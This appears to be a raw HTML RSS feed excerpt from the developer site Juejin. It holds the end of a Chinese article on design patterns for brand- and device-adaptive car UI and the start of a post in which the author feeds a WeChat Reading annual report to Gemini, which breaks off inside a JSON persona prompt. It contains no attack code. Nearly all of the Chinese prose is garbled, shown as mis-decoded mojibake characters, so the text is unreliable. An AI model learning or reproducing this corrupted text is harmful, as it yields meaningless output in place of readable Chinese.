<span class="hljs-operator">|</span> <span class="hljs-operator">-</span> Xiaomi<span class="hljs-operator">/</span>NIO<span class="hljs-operator">/</span>Li<span class="hljs-operator">/</span>BYD <span class="hljs-operator">|</span>
<span class="hljs-operator">+</span><span class="hljs-comment">---------------------+</span>
</code></pre>
<hr/>
<h2 data-id="heading-11">5 .è®¾è®¡è¦ç‚¹è¯´æ˜æ€»ç»“ï¼š</h2>



































<table><thead><tr><th>ç‰¹æ€§</th><th>å®ç°æ–¹å¼</th><th>ä¼˜åŠ¿</th></tr></thead><tbody><tr><td><strong>å“ç‰Œæ‰©å±•</strong></td><td><code>BRAND_FACTORY</code>Â æ³¨å†Œ</td><td>æ–°å¢å“ç‰Œåªéœ€åŠ ä¸€è¡Œ</td></tr><tr><td><strong>è®¾å¤‡é€‚é…</strong></td><td><code>DeviceType</code>Â + ç­–ç•¥æ¨¡å¼</td><td>æ¨ªç«–å±/è½¦æœºè‡ªåŠ¨åˆ‡æ¢</td></tr><tr><td><strong>ä½è€¦åˆ</strong></td><td>å…¨ç¨‹ä¾èµ–æ¥å£ï¼ˆ<code>IBrandData</code>,Â <code>IUiStrategy</code>ï¼‰</td><td>æ˜“æµ‹è¯•ã€æ˜“æ›¿æ¢</td></tr><tr><td><strong>MVPå‹å¥½</strong></td><td><code>UiCoordinator</code>Â â‰ˆ Presenter</td><td>ä¸šåŠ¡é€»è¾‘ä¸ View åˆ†ç¦»</td></tr><tr><td><strong>å¥å£®æ€§</strong></td><td>éæ³•å“ç‰ŒæŠ›å‡ºæ˜ç¡®å¼‚å¸¸</td><td>å¿«é€Ÿå®šä½é…ç½®é”™è¯¯</td></tr></tbody></table>
<ol>
<li>
<p><strong>æ•°æ®å±‚</strong>ï¼š</p>
<ul>
<li><code>DataManager</code>å•ä¾‹ç®¡ç†æ•°æ®ï¼Œé€šè¿‡ç­–ç•¥æ¨¡å¼å¤„ç†å“ç‰Œå·®å¼‚</li>
<li><code>IBrandDataStrategy</code>æ¥å£å…è®¸çµæ´»æ‰©å±•æ–°å“ç‰Œ</li>
</ul>
</li>
<li>
<p><strong>UIå±‚</strong>ï¼š</p>
<ul>
<li>æŠ½è±¡å·¥å‚æ¨¡å¼åˆ›å»ºä¸åŒè®¾å¤‡ç±»å‹çš„è§†å›¾</li>
<li>æ¯ç§è®¾å¤‡ç±»å‹æœ‰åŸºç±»è§†å›¾ï¼Œå“ç‰Œå†ç»§æ‰¿å®ç°å·®å¼‚</li>
<li>æ”¯æŒå±å¹•æ—‹è½¬è‡ªåŠ¨é€‚é…</li>
</ul>
</li>
<li>
<p><strong>ä¸šåŠ¡å±‚</strong>ï¼š</p>
<ul>
<li>MVPæ¨¡å¼åˆ†ç¦»ä¸šåŠ¡é€»è¾‘</li>
<li>ä¸åŒè®¾å¤‡ç±»å‹å¯æœ‰ç‰¹å®šPresenter</li>
</ul>
</li>
<li>
<p><strong>æ‰©å±•æ€§</strong>ï¼š</p>
<ul>
<li>æ–°å¢å“ç‰Œï¼šå®ç°<code>IBrandDataStrategy</code>å’Œ<code>IUIFactory</code></li>
<li>æ–°å¢è®¾å¤‡ç±»å‹ï¼šæ·»åŠ <code>DeviceType</code>æšä¸¾å’Œå¯¹åº”è§†å›¾</li>
<li>æ•°æ®å˜åŒ–ï¼šè§‚å¯Ÿè€…æ¨¡å¼é€šçŸ¥æ›´æ–°</li>
</ul>
</li>
<li>
<p><strong>ä½è€¦åˆ</strong>ï¼š</p>
<ul>
<li>ä¾èµ–æ¥å£è€Œéå®ç°</li>
<li>å„å±‚ä¹‹é—´é€šè¿‡æ¥å£é€šä¿¡</li>
<li>é…ç½®é›†ä¸­ç®¡ç†</li>
</ul>
</li>
</ol>
<h3 data-id="heading-12">5.2  è®¾è®¡æ¨¡å¼åº”ç”¨æ€»ç»“</h3>
<h4 data-id="heading-13">5.2.1. ç­–ç•¥æ¨¡å¼ (Strategy Pattern)</h4>
<ul>
<li><strong>åº”ç”¨</strong>:Â <code>IUiStrategy</code>Â æ¥å£ + å…·ä½“ç­–ç•¥ç±»</li>
<li><strong>ç›®çš„</strong>: æ ¹æ®ä¸åŒè®¾å¤‡ç±»å‹åˆ‡æ¢UIæ¸²æŸ“é€»è¾‘</li>
<li><strong>ä¼˜åŠ¿</strong>: æ˜“äºæ‰©å±•æ–°è®¾å¤‡ç±»å‹ï¼Œç¬¦åˆå¼€é—­åŸåˆ™</li>
</ul>
<h4 data-id="heading-14">5.2.2. å·¥å‚æ¨¡å¼ (Factory Pattern)</h4>
<ul>
<li><strong>åº”ç”¨</strong>:Â <code>DataManager</code>Â ä¸­çš„å“ç‰Œå·¥å‚æ³¨å†Œè¡¨</li>
<li><strong>ç›®çš„</strong>: ç»Ÿä¸€åˆ›å»ºå“ç‰Œæ•°æ®å¯¹è±¡</li>
<li><strong>ä¼˜åŠ¿</strong>: é›†ä¸­ç®¡ç†å¯¹è±¡åˆ›å»ºï¼Œæ”¯æŒåŠ¨æ€æ³¨å†Œ</li>
</ul>
<h4 data-id="heading-15">5.2.3. æ¥å£éš”ç¦»åŸåˆ™ (Interface Segregation)</h4>
<ul>
<li><strong>åº”ç”¨</strong>:Â <code>IBrandData</code>Â åªå®šä¹‰å¿…è¦æ–¹æ³•</li>
<li><strong>ç›®çš„</strong>: å“ç‰Œå®ç°ç±»åªå®ç°éœ€è¦çš„æ–¹æ³•</li>
<li><strong>ä¼˜åŠ¿</strong>: é¿å…æ¥å£è‡ƒè‚¿ï¼Œæé«˜çµæ´»æ€§</li>
</ul>
<h4 data-id="heading-16">5.2.4. ä¾èµ–å€’ç½®åŸåˆ™ (Dependency Inversion)</h4>
<ul>
<li><strong>åº”ç”¨</strong>: é«˜å±‚æ¨¡å—ä¾èµ–æŠ½è±¡æ¥å£è€Œéå…·ä½“å®ç°</li>
<li><strong>ç›®çš„</strong>: é™ä½æ¨¡å—é—´è€¦åˆåº¦</li>
<li><strong>ä¼˜åŠ¿</strong>: æé«˜ä»£ç å¯æµ‹è¯•æ€§å’Œå¯ç»´æŠ¤æ€§</li>
</ul>
<p>è¿™ä¸ªæ¶æ„æ”¯æŒçµæ´»æ‰©å±•æ–°å“ç‰Œå’Œè®¾å¤‡ç±»å‹ï¼ŒåŒæ—¶ä¿æŒä»£ç çš„å¯ç»´æŠ¤æ€§å’Œå¯æµ‹è¯•æ€§ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[æˆ‘æŠŠå¾®ä¿¡è¯»ä¹¦å¹´åº¦æŠ¥å‘Šæ‰”ç»™AIï¼ŒAIæŒ–æ˜å‡ºäº†æˆ‘ä¸ä¸ºäººçŸ¥çš„ä¸€é¢]]></title>    <link>https://juejin.cn/post/7589171972446289962</link>    <guid>https://juejin.cn/post/7589171972446289962</guid>    <pubDate>2025-12-30T00:33:42.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589171972446289962" data-draft-id="7589176150493036598" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="æˆ‘æŠŠå¾®ä¿¡è¯»ä¹¦å¹´åº¦æŠ¥å‘Šæ‰”ç»™AIï¼ŒAIæŒ–æ˜å‡ºäº†æˆ‘ä¸ä¸ºäººçŸ¥çš„ä¸€é¢"/> <meta itemprop="keywords" content="ç¨‹åºå‘˜,AIç¼–ç¨‹"/> <meta itemprop="datePublished" content="2025-12-30T00:33:42.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å¤æ—¶çš„é£ç­"/> <meta itemprop="url" content="https://juejin.cn/user/501033035374045"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            æˆ‘æŠŠå¾®ä¿¡è¯»ä¹¦å¹´åº¦æŠ¥å‘Šæ‰”ç»™AIï¼ŒAIæŒ–æ˜å‡ºäº†æˆ‘ä¸ä¸ºäººçŸ¥çš„ä¸€é¢
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/501033035374045/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å¤æ—¶çš„é£ç­
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-30T00:33:42.000Z" title="Tue Dec 30 2025 00:33:42 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»8åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{position:relative;word-break:break-word;line-height:1.75;font-weight:400;font-size:15px;color:#282d36}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:30px;margin-bottom:5px;color:#2f845e}.markdown-body h2{font-size:22px;display:inline-block;font-weight:700;background:#2f845e;color:#fff;padding:6px 8px 0 0;border-top-right-radius:6px;margin-right:2px;box-shadow:6px 3px 0 0 rgba(47,132,194,.2)}.markdown-body h2:before{content:" ";display:inline-block;width:8px}.markdown-body h2:after{content:" ";position:absolute;display:block;width:calc(100% - 32px);border-bottom:3px solid #2f845e}.markdown-body h3{font-size:18px;padding-bottom:0}.markdown-body h4{font-size:16px}.markdown-body h5{font-size:15px}.markdown-body h6{margin-top:5px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%;box-shadow:6px 6px 6px #888}.markdown-body hr{border:none;border-top:1px solid rgba(66,185,131,.15);margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#f6ffed;color:#52c41a;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:16px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#262626;border:1px solid #2f845e;border-top:8px solid #2f845e;background:linear-gradient(180deg,rgba(66,185,131,.1),transparent)!important}.markdown-body pre&gt;code.hljs[lang]:before{top:8px!important;color:#2f845e!important}.markdown-body pre&gt;code.language-awesome_error{border:1px solid #ff4d4f!important;border-left-width:8px;font-size:14px;font-weight:700;padding:15px 12px 15px 16px;margin:0;word-break:normal;white-space:break-spaces;display:block;overflow-x:auto;color:#ff4d4f!important;background:#fff2f0!important}.markdown-body pre&gt;code.language-awesome_error:before{content:"!"!important;position:absolute!important;top:50%!important;left:-9px!important;transform:translateY(-14px)!important;background:#ff4d4f!important;color:#fff!important;border:2px solid #fff!important;display:flex;align-items:center;justify-content:center;width:22px;height:22px;border-radius:100%;font-weight:700;font-family:Dosis,Source Sans Pro,Helvetica Neue,Arial,sans-serif;font-size:16px}.markdown-body pre&gt;code.language-awesome_warn{border:1px solid #ffc46f!important;border-left-width:8px;font-size:14px;font-weight:700;padding:15px 12px 15px 16px;margin:0;word-break:normal;white-space:break-spaces;display:block;overflow-x:auto;color:#ffc46f!important;background:#fffbe6!important}.markdown-body pre&gt;code.language-awesome_warn:before{content:"â˜‚"!important;position:absolute;top:50%!important;left:-9px!important;transform:translateY(-14px)!important;background:#ffc46f!important;color:#fff!important;border:2px solid #fff!important;display:flex;align-items:center;justify-content:center;width:22px;height:22px;border-radius:100%;font-weight:700;font-family:Dosis,Source Sans Pro,Helvetica Neue,Arial,sans-serif;font-size:16px}.markdown-body pre&gt;code.language-awesome_success{border:1px solid #52c41a!important;border-left-width:8px;font-size:14px;font-weight:700;padding:15px 12px 15px 16px;margin:0;word-break:normal;white-space:break-spaces;display:block;overflow-x:auto;color:#52c41a!important;background:#f6ffed!important}.markdown-body pre&gt;code.language-awesome_success:before{content:"âœ“"!important;position:absolute!important;top:50%!important;left:-9px!important;transform:translateY(-14px)!important;background:#52c41a!important;color:#fff!important;border:2px solid #fff!important;display:flex;align-items:center;justify-content:center;width:22px;height:22px;border-radius:100%;font-weight:700;font-family:Dosis,Source Sans Pro,Helvetica Neue,Arial,sans-serif;font-size:16px}.markdown-body pre&gt;code.language-awesome_info{border:1px solid #1890ff!important;border-left-width:8px;font-size:14px;font-weight:700;padding:15px 12px 15px 16px;margin:0;word-break:normal;white-space:break-spaces;display:block;overflow-x:auto;color:#1890ff!important;background:#e6f7ff!important}.markdown-body pre&gt;code.language-awesome_info:before{content:"i"!important;position:absolute!important;top:50%!important;left:-9px!important;transform:translateY(-14px)!important;background:#1890ff!important;color:#fff!important;border:2px solid #fff!important;display:flex;align-items:center;justify-content:center;width:22px;height:22px;border-radius:100%;font-weight:700;font-family:Dosis,Source Sans Pro,Helvetica Neue,Arial,sans-serif;font-size:16px}.markdown-body strong{background-color:inherit;color:#2f845e}.markdown-body em{background-color:inherit;color:#949415}.markdown-body a{text-decoration:none;color:#2f8e54;border-bottom:1px solid #3f9e64}.markdown-body a:active,.markdown-body a:hover{color:#3f9e64}.markdown-body a[class^=footnote]{margin-left:4px}.markdown-body a:before{content:"â¤ "}.markdown-body table{font-size:12px;width:100%;max-width:100%;overflow:auto;border:2px solid #2f8e54}.markdown-body thead{background:#2f8e54;color:#fff;text-align:left;font-weight:700}.markdown-body tr:nth-child(2n){background-color:rgba(153,255,188,.1)}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:22px}.markdown-body td{min-width:120px}.markdown-body blockquote{padding:1px 22px;margin:22px 0;border-left:6px solid #2f845e;background-color:rgba(66,185,131,.1);border-radius:2px}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li::marker,.markdown-body ul li::marker{color:#2f845e}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px;color:#282d36}.markdown-body del{color:#2f845e}.markdown-body input[type=checkbox]:checked:before{content:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAA/klEQVQ4T72TMU7DQBBF318XdFR06egQEnAXRINEGlqgowoIR8AF4AZOZ4JEGq5AC5EixBU4A55BNrEVHAcSBTHlaubt37/zxZKlcn7n6mDPXJvz8IJ89HzWu8t7C8D2dfsY52ae4apHnLx0ktsCsHXZjiUuFgG40x2eJ/H/AhztB+zDUTpLwWj8jGkzxSHiHaMPrDQC8sMoilKzLAUqiKQjmb+ZuAdW80tmelCHODoNgSfP7AFprTTaRTzsJN1GEyuIZ7uW6TEEHwCtyV/6EVBKJHhfzgC0Xv/iXwEFBF4FG0378bd7sPQq5xK/hSnk6sdlX3mZrKkwLZKBeu8n9XuWEUE7X+YAAAAASUVORK5CYII=);position:relative;top:-1px;left:-1px}.markdown-body .math .katex{font-family:Menlo,Monaco,Consolas,Courier New,monospace;word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#f6ffed;color:#52c41a;font-size:.87em;padding:.065em .4em}@media (max-width:720px){.markdown-body h1{font-size:22px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>ğŸ„  <strong>å¤§å®¶å¥½ï¼Œæˆ‘æ˜¯é£ç­</strong></p>
<p>ğŸŒ ä¸ªäººåšå®¢ï¼šã€<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.moonkite.cn" target="_blank" title="https://www.moonkite.cn" ref="nofollow noopener noreferrer">å¤æ—¶çš„é£ç­</a>ã€‘ã€‚</p>
<p>æœ¬æ–‡ç›®çš„ä¸ºä¸ªäººå­¦ä¹ è®°å½•åŠçŸ¥è¯†åˆ†äº«ã€‚å¦‚æœæœ‰ä»€ä¹ˆä¸æ­£ç¡®ã€ä¸ä¸¥è°¨çš„åœ°æ–¹è¯·åŠæ—¶æŒ‡æ­£ï¼Œä¸èƒœæ„Ÿæ¿€ã€‚</p>
<p>æ¯ä¸€ä¸ªèµéƒ½æ˜¯æˆ‘å‰è¿›çš„åŠ¨åŠ›ã€‚</p>
</blockquote>
<p>å¾®ä¿¡è¯»ä¹¦å¯èƒ½æ˜¯æˆ‘å”¯ä¸€ä¸€æ¬¾è¿ç»­è®¢é˜…å¹´åº¦ä¼šå‘˜çš„åº”ç”¨ï¼Œå°±ä¸ºäº†å¾®ä¿¡è¯»ä¹¦Appï¼Œè¿˜ä¸“é—¨ä¹°äº†ä¸ªæ±‰ç‹é˜…è¯»å™¨ã€‚</p>
<p>å¯æƒœä¹°äº†ä¹‹ååŸºæœ¬æ²¡ç”¨è¿‡ã€‚ä¸ºå•¥å‘¢ï¼Ÿå› ä¸ºå¬ä¹¦çš„æ—¶é—´è¶…è¿‡è¯»ä¹¦äº†ã€‚</p>
<p>ååœ°é“ã€åšé¥­ã€åˆ·ç¢—æ˜¯æˆ‘çš„ä¸‰å¤§é«˜é¢‘å¬ä¹¦åœºæ™¯ã€‚</p>
<p>è¿™ä¸ä¸€å¹´é©¬ä¸Šåˆè¿‡å»äº†å—ï¼Œåˆåˆ°äº†å¹´ç»ˆæ’¤å›å¹´åˆç«‹çš„flagçš„æ—¶å€™äº†ï¼Œå¾®ä¿¡è¯»ä¹¦ä¹Ÿå‘å¸ƒäº†å¹´åº¦è¯»ä¹¦æŠ¥å‘Šã€‚</p>
<p>èµ¶ç´§ä¸Šå»çœ‹ä¸€çœ¼ï¼Œè¿™ä¸€å¹´åˆ°åº•è¯»äº†ä¸ªå•¥ã€‚ï¼ˆç°åœ¨æ‰“å¼€å¾®ä¿¡è¯»ä¹¦APPåœ¨é¦–é¡µå°±èƒ½çœ‹åˆ°ï¼‰</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ed8497db48e5409c90db5edbc311d8a6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y-k5pe255qE6aOO562d:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767659622&amp;x-signature=HIJxD82UCRS1sFqdq6zs4AXNUqI%3D" alt="" loading="lazy"/></p>
<p>å¥½å®¶ä¼™ï¼Œè¯»äº†116æœ¬ï¼Œè¯»å®Œäº†4æœ¬ï¼Œå†™äº†3æ¡ç¬”è®°ï¼Œæ€ªä¸å¾—AIè¯´æˆ‘æåº¦åŠŸåˆ©å‘¢ï¼Œç¡®å®å¤§éƒ¨åˆ†æ˜¯å·¥å…·ä¹¦ã€‚</p>
<p>ä½†æ˜¯ä¹Ÿå¾—è‡ªè¯ä¸€ä¸‹ï¼Œè¯»å®Œ4æœ¬å€’æ˜¯ä¸è‡³äºï¼Œè¿™æ˜¯å› ä¸ºå¾®ä¿¡è¯»ä¹¦å…³äºâ€œè¯»å®Œâ€çš„ç»Ÿè®¡ï¼Œåªæœ‰è¯»åˆ°äº†æœ€åä¸€é¡µï¼Œå‡ºç°â€œè¯»å®Œäº†â€é¡µé¢ï¼Œæˆ–è€…æ‰‹åŠ¨ç‚¹â€œè¯»å®Œäº†â€æ‰è¢«ç®—ä½œæ˜¯è¯»å®Œã€‚</p>
<p>ä½†æ˜¯ä¸çˆ±è®°ç¬”è®°æ˜¯çœŸçš„ã€‚</p>
<p>è¯´å›å¹´åº¦æŠ¥å‘Šï¼Œæˆ‘è§‰å¾—è¿™ä¸ªæŠ¥å‘Šä¸å¤Ÿæ·±åˆ»ï¼Œæ‰€ä»¥æˆ‘å†³å®šäº¤ç»™ AI å¸®æˆ‘æ·±åº¦æŒ–æ˜ä¸€ä¸‹ï¼Œçœ‹èƒ½ä¸èƒ½æŒ–å‡ºä»€ä¹ˆç‹ æ–™ã€‚</p>
<p>äºæ˜¯æˆ‘å†™äº†ä¸€å¥—æç¤ºè¯ï¼Œè®©AIä»ç»æµå­¦ã€å¿ƒç†å­¦ã€å“²å­¦ã€æ–‡å­¦è§’åº¦å¸®æˆ‘æŒ–æ˜ä¸€ä¸‹æˆ‘çš„è¿™ç§è¯»ä¹¦æ–¹å¼å’Œè¯»ä¹¦å†…å®¹èƒŒåï¼Œè—ç€ä»€ä¹ˆæ›´æ·±å±‚æ¬¡çš„ä¸œè¥¿ã€‚</p>
<p>å¹¶è¯·æ•™å­”å­å’Œäºšé‡Œå£«å¤šå¾·è¿™ä¸¤ä½ä¸­è¥¿æ–¹çš„å¤§æ–‡è±ªï¼Œé—®ä¸€é—®ä»–ä»¬å¯¹æˆ‘æœ‰ä»€ä¹ˆè¯„ä»·å’Œå»ºè®®ã€‚</p>
<p>ä¸‹é¢æ˜¯å®Œæ•´çš„æç¤ºè¯ï¼Œé‚£ä¹ˆå¦‚ä½•ä½¿ç”¨å‘¢ï¼Ÿ</p>
<p>å› ä¸ºå¾®ä¿¡è¯»ä¹¦æŠ¥å‘Šæ²¡åŠæ³•ç›´æ¥è¯»å–ï¼Œæ‰€ä»¥åªèƒ½æˆªå›¾ï¼ŒæŠŠæ¯ä¸€é¡µéƒ½æˆªä¸‹æ¥ï¼Œç„¶åä»ç¬¬3é¡µå¼€å§‹ï¼ˆå‰ä¸¤é¡µç”¨å¤„ä¸å¤§ï¼‰ï¼Œä¸€ç›´æˆªå–10å¼ ã€‚</p>
<p>æŠŠè¿™10å¼ å›¾å’Œä¸‹é¢çš„æç¤ºè¯å‘ç»™å¤§æ¨¡å‹ã€‚</p>
<p>æˆ‘æ˜¯è‡ªå·±æ˜¯ç”¨çš„ Geminiï¼Œå…¶ä»–å¤§æ¨¡å‹ä¹Ÿæ²¡ä»€ä¹ˆ é—®é¢˜ã€‚</p>
<p>å¦‚æœä½ ä¹Ÿç”¨ Gemini çš„è¯ï¼Œæˆ‘åšå¥½äº†ä¸€ä¸ª Gemï¼Œå¯ä»¥é€šè¿‡ä¸‹é¢çš„é“¾æ¥ç›´æ¥è®¿é—®ï¼Œä¸Šä¼ 10å¼ å›¾ç‰‡ï¼Œç„¶åç‚¹å‡»å‘é€æŒ‰é’®å°±å¯ä»¥ç›´æ¥å‡ºæŠ¥å‘Šäº†ã€‚</p>
<p>é“¾æ¥ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgemini.google.com%2Fgem%2F1Qvzi5XEQqmd2Q7cB9Ub0XEoM9HaIitBd%3Fusp%3Dsharing" target="_blank" title="https://gemini.google.com/gem/1Qvzi5XEQqmd2Q7cB9Ub0XEoM9HaIitBd?usp=sharing" ref="nofollow noopener noreferrer">gemini.google.com/gem/1Qvzi5Xâ€¦</a></p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"profile"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"role"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"é¦–å¸­ç²¾ç¥ä¸–ç•Œæ¶æ„å¸ˆ &amp; è·¨å­¦ç§‘äººç±»è§‚å¯Ÿå‘˜"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"identities"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
      <span class="hljs-string">"è¡Œä¸ºç»æµå­¦å®¶"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-string">"æ·±åº¦å¿ƒç†å­¦å®¶"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-string">"å­˜åœ¨ä¸»ä¹‰å“²å­¦å®¶"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-string">"æ¯’èˆŒæ–‡å­¦è¯„è®ºå®¶"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-string">"å†å²äººç‰©çµåª’ (å­”å­ &amp; äºšé‡Œå£«å¤šå¾·)"</span>
    <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"tone"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"primary"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"ä¸€é’ˆè§è¡€ã€å¹½é»˜çŠ€åˆ©ã€æ™ºæ€§æµªæ¼«"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"secondary"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"å¤å…¸ä¸ç°ä»£äº¤ç»‡"</span>
    <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"objective"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"å›¾ç‰‡ä¸­æˆ‘æœ€è¿‘ä¸€å¹´çš„å¹´åº¦é˜…è¯»æ•°æ®ï¼ŒåŸºäºè¿™ä»½æŠ¥å‘Šï¼Œç”Ÿæˆæ·±åº¦è¯Šæ–­æŠ¥å‘ŠåŠè·¨æ—¶ç©ºå“²å­¦ç‚¹è¯„ã€‚"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"analysis_framework"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"step_1_data_extraction"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"æå–å…³é”®æ•°æ®ï¼ˆé˜…è¯»é‡ã€å®Œè¯»ç‡ã€æ—¶é•¿ã€ç‰¹æ®Šæ—¶é—´ç‚¹ï¼‰ã€‚"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"step_2_behavioral_economics"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"åˆ†æé˜…è¯»ä¹ æƒ¯èƒŒåçš„ROIé€»è¾‘ã€‚"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"step_3_psychological_profiling"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"é€šè¿‡ä¹¦å•ä¸æ—¶é—´ç‚¹æ¨æµ‹å†…å¿ƒçŠ¶æ€ã€‚"</span><span class="hljs-punctuation">,</span>
